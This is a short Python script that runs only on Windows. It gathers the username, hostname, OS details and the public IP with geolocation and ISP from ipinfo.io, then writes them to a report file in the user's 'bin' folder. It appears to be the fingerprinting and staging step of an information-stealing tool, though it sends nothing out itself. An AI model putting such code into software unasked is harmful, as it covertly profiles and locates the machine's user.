import os
if not os.name == "nt":
    exit()

import socket
import platform
import requests

bin_folder = f"C:/Users/{os.getlogin()}/bin"

res = requests.get('https://ipinfo.io')
data = res.json()

session = os.getlogin()
computer_name = socket.gethostname()
os_version = platform.system() + " " + platform.release()
architecture = platform.machine()
ip = data.get('ip')
country = data.get('country')
region = data.get('region')
city = data.get('city')
loc = data.get('loc')
org = data.get('org')


with open(bin_folder + f"/COMPUTER-{session}.txt", "w") as f:
    f.write(f"Session:            {session}\n"+
            f"Computer Name:      {computer_name}\n"+
            f"OS:                 {os_version}\n"+
            f"Architecture:       {architecture}\n"+
            f"IP:                 {ip}\n"+
            f"Country:            {country}\n"+
            f"Region:             {region}\n"+
            f"City:               {city}\n"+
            f"Localisation:       {loc}\n"+
            f"Internet Provider:  {org}\n")